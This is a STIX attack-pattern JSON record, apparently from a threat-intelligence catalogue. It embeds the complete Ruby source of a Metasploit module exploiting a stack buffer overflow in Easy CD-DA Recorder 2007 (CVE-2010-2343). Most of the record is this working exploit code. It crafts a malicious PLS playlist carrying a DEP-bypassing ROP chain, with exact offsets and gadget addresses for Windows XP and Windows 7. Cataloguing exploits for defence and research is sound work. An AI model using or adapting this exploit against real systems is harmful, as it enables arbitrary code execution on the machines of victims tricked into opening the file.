{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c1467b07-c2cc-443c-892e-9414ec667cb1",
    "created": "2024-08-14T16:37:21.995862Z",
    "modified": "2024-08-14T16:37:21.995866Z",
    "name": "Easy CD-DA Recorder PLS Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in Easy CD-DA Recorder 2007 caused by an overlong string in a playlist entry. By persuading the victim to open a specially-crafted PLS file, a remote attacker can execute arbitrary code on the system or cause the application to crash. This module has been tested successfully on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/easycdda_pls_bof.rb",
            "external_id": "easycdda_pls_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2343"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/advisories.php?id=CORELAN-10-048"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Easy CD-DA Recorder PLS Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in\n        Easy CD-DA Recorder 2007 caused by an overlong string in a playlist entry.\n        By persuading the victim to open a specially-crafted PLS file, a\n        remote attacker can execute arbitrary code on the system or cause\n        the application to crash. This module has been tested successfully on\n        Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'chap0',        # Vulnerability discovery and original exploit\n          'Gabor Seljan', # Metasploit module\n          'juan vazquez'  # Improved reliability\n        ],\n      'References'     =>\n        [\n          [ 'BID', '40631' ],\n          [ 'EDB', '13761' ],\n          [ 'OSVDB', '65256' ],\n          [ 'CVE', '2010-2343' ],\n          [ 'URL', 'http://www.corelan.be:8800/advisories.php?id=CORELAN-10-048' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'DisableNops'    => true,\n          'BadChars'       => \"\\x0a\\x3d\",\n          'Space'          => 2454,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\"  # ADD ESP,-3500\n        },\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 / Windows 7 SP1 (DEP Bypass)',\n            # easycdda.exe 3.0.114.0\n            # audconv.dll 7.0.815.0\n            {\n              'Offset' => 1108,\n              'Ret'    => 0x1001b19b  # ADD ESP,0C10 # RETN 0x04 [audconv.dll]\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-06-07',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.', 'msf.pls'])\n        ],\n      self.class)\n\n  end\n\n  def nops\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  def rop_nops(n = 1)\n    # RETN (ROP NOP) [audconv.dll]\n    [0x1003d55d].pack('V') * n\n  end\n\n  def exploit\n\n    # ROP chain generated by mona.py - See corelan.be\n    rop_gadgets =\n    [\n      0x1007261e,  # POP EDX # RETN [audconv.dll]\n      0x0042a0e0,  # &VirtualProtect() [IAT easycdda.exe]\n      0x1003bd6b,  # MOV EAX,DWORD PTR DS:[EDX] # RETN [audconv.dll]\n      0x10035802,  # XCHG EAX,ESI # RETN [audconv.dll]\n      0x1005d288,  # POP EBP # RETN [audconv.dll]\n      0x004030c8,  # &PUSH ESP # RET 0x08 [easycdda.exe]\n      0x1005cc2d,  # POP EBX # RETN [audconv.dll]\n      0x00000996,  # 0x00000996-> EBX\n      0x1008740c,  # POP EDX # RETN [audconv.dll]\n      0x00000040,  # 0x00000040-> EDX\n      0x1001826d,  # POP ECX # RETN [audconv.dll]\n      0x004364c6,  # &Writable location [easycdda.exe]\n      0x00404aa9,  # POP EDI # RETN [easycdda.exe]\n      0x100378e6,  # RETN (ROP NOP) [audconv.dll]\n      0x0042527d,  # POP EAX # RETN [easycdda.exe]\n      nops,\n      0x00429692   # PUSHAD # INC EBX # ADD CL,CH # RETN [easycdda.exe]\n    ].flatten.pack('V*')\n\n    sploit =  rop_nops(target['Offset'] / 4)\n    sploit << [0x1003d55c].pack(\"V\") # pop edi # ret [audconv.dll]\n    sploit << [target.ret].pack(\"V\")\n    sploit << rop_nops(22)\n    sploit << rop_gadgets\n    sploit << payload.encoded\n    sploit << rand_text_alpha_upper(10000) # Generate exception\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sploit)\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2010-06-07",
    "x_mitre_platforms": [
        "win'"
    ]
}